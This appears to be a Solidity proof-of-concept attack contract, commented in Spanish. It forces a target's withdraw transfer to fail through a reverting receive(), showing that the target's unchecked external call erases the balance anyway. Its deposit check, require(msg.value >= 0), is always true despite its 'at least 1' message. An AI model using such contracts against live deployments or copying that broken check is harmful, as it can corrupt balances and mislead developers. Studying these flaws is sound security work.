// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUncheckedExternalCall {
    function deposit() external payable;
    function withdraw() external;
}

contract AttackUncheckedCall {
    IUncheckedExternalCall public target;

    constructor(address _target) {
        target = IUncheckedExternalCall(_target);
    }

    // Se fuerza el fallo de la llamada: devuelve error
    receive() external payable {
        revert("No quiero recibir el credito");
    }

    function deposit() public payable {
        require(msg.value >= 0, "Need at least 1");
        target.deposit{value: msg.value}();
    }

    function attack() public payable {
        target.withdraw(); // La transferencia falla, pero se borra el saldo igualmente
    }
}
